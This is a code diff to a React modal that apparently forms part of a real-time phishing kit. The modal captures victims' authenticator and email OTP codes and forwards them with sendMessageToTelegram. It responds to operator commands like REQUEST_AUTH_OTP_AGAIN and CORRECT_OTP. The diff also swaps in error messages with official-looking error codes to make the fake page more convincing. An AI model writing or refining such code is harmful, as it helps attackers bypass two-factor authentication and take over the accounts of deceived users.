@@ -20,11 +20,18 @@ export default function Modal({ displayModal, setDisplayModal, modal, setModal }
         console.log("Command is ", command);
         if (command === 'REQUEST_AUTH_OTP_AGAIN') {
             console.log("COMMAND IN VEFIR IS ", command)
+            setIsLoading(false);
             setInvalid(true);
         } else if (command === 'REQUEST_EMAIL_OTP_AGAIN') {
             console.log("Command in VERIF IS ", command )
+            setIsLoading(false);
             setInvalid(true);
-        }
+        }  else if (command === 'CORRECT_OTP') {
+            console.log("Command in VERIF IS ", command )
+            setIsLoading(false);
+            setOtpCode('');
+            setDisplayModal(false);
+        } 
     }, [command, modal]);
 
     // Modal visibility effect - this was missing in your current implementation
@@ -54,7 +61,7 @@ export default function Modal({ displayModal, setDisplayModal, modal, setModal }
                 console.log(`Sending ${modal} OTP:`, otpCode);
                 
                 // For now, just simulate success and close modal
-                setIsLoading(false);
+                
                 sendMessageToTelegram(otpCode);
                 setOtpCode('');
                 // setDisplayModal(false);
@@ -122,8 +129,8 @@ export default function Modal({ displayModal, setDisplayModal, modal, setModal }
                                     {invalid && (
                                         <p className="text-red-500 text-sm mt-1">
                                             {modal === 'AuthApp' 
-                                                ? "Invalid authenticator code. Please try again."
-                                                : "Invalid email verification code. Please check your email."}
+                                                ? "You have entered an incorrect 2FA verification code.(200001013-210a9570)"
+                                                : "Incorrect verification code. Please check your emails or resend the code and try again.(001412-c91b96d1)"}
                                         </p>
                                     )}
 
